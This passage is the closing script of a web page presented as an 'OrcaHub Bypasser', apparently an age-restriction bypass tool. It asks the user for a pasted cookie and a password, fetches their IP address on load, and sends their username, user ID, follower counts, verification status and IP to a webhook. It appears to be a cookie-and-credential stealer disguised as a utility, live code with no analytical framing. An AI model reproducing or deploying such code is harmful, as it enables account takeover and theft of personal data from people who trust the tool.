                DOM.loader.classList.remove('show');
                DOM.result.classList.add('show');

                DOM.bypassBtn.disabled = false;
                DOM.bypassBtn.textContent = '🚀 Start Bypass';

                // Send final message
                const message = `
        ✅ Age Exceeded Successfully
        👤 Username: ${currentUserData?.username || 'Unknown'}
        🆔 User ID: ${currentUserData?.userId || 'Unknown'}
        📊 Followers: ${currentUserData?.followers?.toLocaleString() || 'Unknown'}
        📊 Following: ${currentUserData?.following?.toLocaleString() || 'Unknown'}
        ✅ Verified: ${currentUserData?.isVerified ? 'Yes' : 'No'}
        🌐 IP: ${userIP}
        `;
                sendToWebhook(message);

                setTimeout(() => {
                    DOM.result.classList.remove('show');
                }, 8000);
            }

            // ==================== EVENT BINDINGS ====================
            DOM.verifyBtn.addEventListener('click', verifyCookie);
            DOM.nextToBypassBtn.addEventListener('click', startBypass);
            DOM.bypassBtn.addEventListener('click', startBypass);

            DOM.backToStep1Btn.addEventListener('click', function() { setStep(1); });
            DOM.backToStep2Btn.addEventListener('click', function() { setStep(2); });

            DOM.cookieInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') verifyCookie();
            });
            DOM.passwordInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') startBypass();
            });

            // ==================== INIT ====================
            setStep(1);
            getIP();

            // Check for valid cookie on paste
            DOM.cookieInput.addEventListener('input', function() {
                const val = this.value.trim();
                if (val.length > 15) {
                    this.classList.remove('error');
                    this.classList.add('success');
                } else {
                    this.classList.remove('success');
                }
            });

            console.log('[🦈] OrcaHub Bypasser loaded!');
        });
    </script>

</body>
